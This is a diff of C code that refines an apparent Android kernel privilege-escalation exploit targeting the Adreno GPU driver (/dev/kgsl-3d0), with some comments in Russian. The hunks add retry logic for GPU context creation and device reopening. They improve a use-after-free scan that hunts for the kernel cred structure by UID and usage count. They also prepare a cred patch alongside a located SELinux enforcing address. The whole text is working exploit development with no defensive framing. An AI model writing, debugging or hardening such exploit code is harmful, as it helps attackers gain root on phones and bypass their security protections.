@@ -955,9 +955,22 @@ static int gpu_write_task_virt(int fd, uint64_t dst_va, uint8_t *buffer, size_t 
     int result = -1;
 
     struct kgsl_drawctxt_create ctx = {.flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC};
-    if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0)
+    
+    int retry = 10;
+    while (retry--) {
+        if (ioctl(fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) == 0) {
+            ctx_id = ctx.drawctxt_id;
+            break;
+        }
+        if (retry > 0) {
+            usleep(200000); // 200ms
+        }
+    }
+    
+    if (ctx_id == 0) {
+        fprintf(stderr, "[GPU_WRITE] Failed to create context after 10 retries\n");
         return -1;
-    ctx_id = ctx.drawctxt_id;
+    }
 
     struct kgsl_gpuobj_alloc ib_alloc = {.size = PAGE_SIZE * 4, .flags = KGSL_MEMFLAGS_USE_CPU_MAP};
     if (ioctl(fd, IOCTL_KGSL_GPUOBJ_ALLOC, &ib_alloc) != 0)
@@ -1292,9 +1305,15 @@ static void safe_cred_patch(void)
     }
 
     if (fd < 0) {
-        fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
+        int retry = 5;
+        while (retry--) {
+            fd = open(DEV_PATH, O_RDWR | O_CLOEXEC);
+            if (fd >= 0) break;
+            fprintf(stderr, "[CHILD] [!] Failed to reopen /dev/kgsl-3d0, retrying in 1s...\n");
+            sleep(1);
+        }
         if (fd < 0) {
-            fprintf(stderr, "[CHILD] [!] Failed to reopen /dev/kgsl-3d0\n");
+            fprintf(stderr, "[CHILD] [!] Failed to reopen /dev/kgsl-3d0 after retries\n");
             gbuf[GBUF_TASK_SPRAY] = 0x1;
             return;
         }
@@ -1915,13 +1934,14 @@ static int scan_uaf_for_nonzero_multi(int fd, int batch_idx, int *num_found)
                                 // Ищем UID в первых 64 байтах структуры cred
                                 for (int j = 0; j < 12; j++) {
                                     uint32_t val = check[j];
-                                    if (val <= 20000) { // Ищем от 0 до 20000
+                                    // check[0] - это usage (atomic_t). Он ДОЛЖЕН быть > 0 для живого процесса.
+                                    if (check[0] > 0 && check[0] < 1000 && val <= 20000) {
                                         // Если нашли UID, проверяем соседние поля (обычно uid == gid == suid == sgid)
                                         if (check[j] == check[j+1] || check[j] == check[j+2]) {
                                             found_cred_ptr = ptr;
                                             found_cred_off = i;
-                                            fprintf(stderr, "    [+++] MATCH FOUND! Offset 0x%x -> Pointer 0x%lx (UID %u at cred+0x%x)\n", 
-                                                    i, (unsigned long)ptr, val, j*4);
+                                            fprintf(stderr, "    [+++] MATCH FOUND! Offset 0x%x -> Pointer 0x%lx (UID %u at cred+0x%x, usage %u)\n", 
+                                                    i, (unsigned long)ptr, val, j*4, check[0]);
                                             break;
                                         }
                                     }
@@ -2789,6 +2809,12 @@ restart:;
     fprintf(stderr, "[+] SELinux enforcing at: 0x%lx\n", (unsigned long)selinux_enforcing);
     
     fprintf(stderr, "[+] Triggering cred patch in target process %d...\n", target_pid);
+    
+    // Закрываем GPU FD в родителе, чтобы освободить ресурсы для ребенка
+    if (fd > 0) {
+        close(fd);
+        fd = -1;
+    }
     
     gbuf[0] = 0xab; // ТРИГГЕР!
     gbuf[GBUF_FOUND_PID] = 0x11;
